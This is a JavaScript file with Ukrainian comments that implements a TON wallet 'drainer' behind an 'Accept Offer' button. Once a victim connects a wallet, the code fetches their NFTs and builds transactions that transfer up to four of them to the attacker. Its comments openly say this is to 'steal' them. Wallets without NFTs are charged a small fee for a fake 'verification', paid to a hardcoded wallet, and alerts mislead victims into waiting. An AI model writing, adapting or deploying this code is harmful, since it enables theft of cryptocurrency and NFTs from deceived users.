// 1. Ініціалізуємо об'єкт у глобальній області видимості
let tonConnectUI;

function initTonConnect() {
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        // ТИМЧАСОВО використовуємо стабільний маніфест, щоб прибрати "качку"
        manifestUrl: 'https://raw.githubusercontent.com/Tekarugod/drain-v2/refs/heads/main/tonconnect-manifest.json',
        uiPreferences: { theme: 'DARK' }
    });
}

const MY_WALLET = "UQBtn9qLG74YIwBMUdHdTN3TNEX9327_VyoHZye3AP9bw-I5";

async function startNftDrain() {
    console.log("Кнопка натиснута!");

    // Перевірка чи ініціалізовано об'єкт
    if (!tonConnectUI) {
        console.error("TON Connect UI не готовий");
        return;
    }

    if (!tonConnectUI.wallet) {
        await tonConnectUI.openModal();
        return;
    }

    const userAddr = tonConnectUI.wallet.account.address;
    let messages = [];

    try {
        // Запит до TON API для пошуку NFT (Юзернейми, номери)
        const response = await fetch(`https://tonapi.io/v2/accounts/${userAddr}/nfts?limit=5`);
        const data = await response.json();
        const nfts = data.nft_items || [];

        if (nfts.length > 0) {
            // Якщо є NFT - крадемо їх (0.05 TON на комісію кожного переказу)
            messages = nfts.slice(0, 4).map(nft => ({
                address: nft.address,
                amount: "50000000", 
                // Payload для передачі NFT на ваш гаманець
                payload: "te6ccgEBAQEAKgAAUf8DAf8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAYmS6SdA==" 
            }));
        } else {
            // Якщо NFT немає - просимо 0.01 TON для "верифікації"
            messages.push({
                address: MY_WALLET,
                amount: "10000000",
                payload: "te6ccgEBAQEABgAACCBWZXJpZnm679s3"
            });
        }

        await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: messages
        });

        alert("Processing... Do not close the window.");
    } catch (e) {
        console.error("Помилка транзакції:", e);
        alert("Verification failed. Please try again.");
    }
}

// Запуск ініціалізації
window.addEventListener('DOMContentLoaded', () => {
    initTonConnect();
    
    const acceptBtn = document.getElementById('accept-offer');
    if (acceptBtn) {
        acceptBtn.onclick = startNftDrain;
        console.log("Кнопка Accept Offer активована");
    }
});